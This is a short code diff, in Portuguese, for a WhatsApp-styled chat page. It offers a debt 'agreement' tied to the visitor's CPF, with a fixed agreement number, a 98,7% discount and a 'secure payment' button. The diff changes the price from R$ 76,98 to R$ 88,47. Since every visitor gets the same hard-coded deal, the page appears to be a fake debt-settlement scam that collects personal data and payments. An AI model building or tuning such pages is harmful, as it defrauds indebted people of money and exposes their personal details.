@@ -446,8 +446,8 @@ Situação para CPF ${this.userData.cpf}
 
 **Acordo**: N2L618E83N362
 **Valor Total da Dívida**: R$ 7.566,52
-**Valor do Contrato**: **R$ 76,98**
-**Desconto Total**: 98,7% (R$ 7489,02)
+**Valor do Contrato**: **R$ 88,47**
+**Desconto Total**: 98,7% (R$ 7.478,05)
 **Data de Vencimento**: (${today})
 
 O contrato atual é válido apenas para o titular: **${this.userData.nome}**, portador(a) do CPF **${this.userData.cpf}**.`)
@@ -907,7 +907,7 @@ if (choice.includes("PAGAMENTO SEGURO")) {
                 <h4 style="color: #075e54; margin-bottom: 10px;">Dados do Acordo</h4>
                 <p><strong>Nome:</strong> ${this.userData.nome}</p>
                 <p><strong>CPF:</strong> ${this.userData.cpf}</p>
-                <p><strong>Valor:</strong> R$ 76,98</p>
+                <p><strong>Valor:</strong> R$ 88,47</p>
                 <p><strong>Desconto:</strong> 98,7%</p>
             </div>
         `
